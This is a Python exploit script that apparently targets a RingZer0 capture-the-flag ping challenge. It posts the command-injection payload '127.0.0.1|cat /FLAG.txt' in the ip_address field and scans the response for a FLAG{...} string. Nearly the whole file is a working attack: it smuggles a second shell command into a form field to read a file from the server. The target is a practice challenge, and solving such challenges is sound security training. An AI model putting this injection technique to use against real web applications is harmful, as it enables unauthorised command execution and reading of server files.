import requests
import re

# Configure the target URL
url = "http://challenges.ringzer0team.com:10190/ping"

# Use pipe operator as command separator
# This will execute: ping 127.0.0.1 | cat /FLAG.txt
# The pipe sends output of ping to cat, but since cat ignores stdin and reads the file,
# we should get the flag content
payload = "127.0.0.1|cat /FLAG.txt"

# Prepare POST data with proper Content-Type
post_data = {'ip_address': payload}
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
}

print(f"[+] Target: {url}")
print(f"[+] Method: POST")
print(f"[+] Parameter: ip_address")
print(f"[+] Payload: {payload}")
print("[+] Attempting command injection...\n")

try:
    # Send POST request
    response = requests.post(url, data=post_data, headers=headers, timeout=10)
    
    # Print response status
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Content Length: {len(response.content)} bytes\n")
    
    # Print full response for analysis
    print("=" * 60)
    print("RESPONSE BODY:")
    print("=" * 60)
    print(response.text)
    print("=" * 60)
    
    # Extract flag using regex
    flag_pattern = r'FLAG\{[^}]+\}'
    match = re.search(flag_pattern, response.text)
    
    if match:
        print(f"\n[!] FLAG FOUND: {match.group(0)}")
    else:
        print("\n[!] No flag pattern found in response")

except requests.exceptions.Timeout:
    print("[-] Request timed out - target may be slow or unresponsive")
except requests.exceptions.ConnectionError:
    print("[-] Connection error - target may be unreachable")
except Exception as e:
    print(f"[-] Error: {type(e).__name__}: {e}")
